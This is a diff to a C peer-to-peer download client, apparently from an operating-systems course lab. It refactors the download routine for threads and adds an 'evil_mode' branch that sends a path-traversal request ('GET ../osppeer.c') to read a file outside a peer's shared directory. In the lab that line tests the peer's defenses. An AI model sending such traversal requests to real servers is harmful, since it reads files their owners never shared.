@@ -535,7 +535,7 @@ task_t *start_download(task_t *tracker_task, const char *filename)
 //	directory.  't' was created by start_download().
 //	Starts with the first peer on 't's peer list, then tries all peers
 //	until a download is successful.
-static void task_d1(task_t *t) {
+static void* task_d1(task_t *t) {
     int i, ret = -1;
     assert(!t || t->type == TASK_DOWNLOAD);
 
@@ -544,7 +544,7 @@ static void task_d1(task_t *t) {
 		error("* No peers are willing to serve '%s'\n",
 		      (t ? t->filename : "that file"));
 		task_free(t);
-		return;
+		return (void*) -1;
 	} else if (t->peer_list->addr.s_addr == listen_addr.s_addr
 		   && t->peer_list->port == listen_port)
 		goto try_again;
@@ -558,7 +558,10 @@ static void task_d1(task_t *t) {
 		error("* Cannot connect to peer: %s\n", strerror(errno));
 		goto try_again;
 	}
-	osp2p_writef(t->peer_fd, "GET %s OSP2P\n", t->filename);
+    if(evil_mode == 2)
+        osp2p_writef(t->peer_fd, "GET ../osppeer.c OSP2P\n");
+    else
+    	osp2p_writef(t->peer_fd, "GET %s OSP2P\n", t->filename);
 
 	// Open disk file for the result.
 	// If the filename already exists, save the file in a name like
@@ -583,7 +586,7 @@ static void task_d1(task_t *t) {
 		error("* Too many local files like '%s' exist already.\n\
 * Try 'rm %s.~*~' to remove them.\n", t->filename, t->filename);
 		task_free(t);
-		return;
+		return (void*) -1;
 	}
 
 	// Read the file into the task buffer from the peer,
@@ -606,7 +609,7 @@ static void task_d1(task_t *t) {
 
 	// Empty files are usually a symptom of some error.
 	if (t->total_written > 0) {
-		return;
+		return (void*) 0;
 	}
 	error("* Download was empty, trying next peer\n");
 
@@ -615,7 +618,7 @@ static void task_d1(task_t *t) {
 		unlink(t->disk_filename);
 	// recursive call
 	task_pop_peer(t);
-	task_d1(t);
+	return task_d1(t);
 }
 
 static void task_d2(task_t *t, task_t *tracker_task) {
@@ -947,7 +950,8 @@ int main(int argc, char *argv[])
     void **st = NULL;
     for(i = 0; i < tasks; i++) {
         pthread_join(*(task_list->thread_id), st);
-	    task_d2(task_list->task, tracker_task);
+        if(st == 0)
+    	    task_d2(task_list->task, tracker_task);
 	    task_node_t *temp = task_list;
 	    task_list = task_list->next;
         free(temp->thread_id);
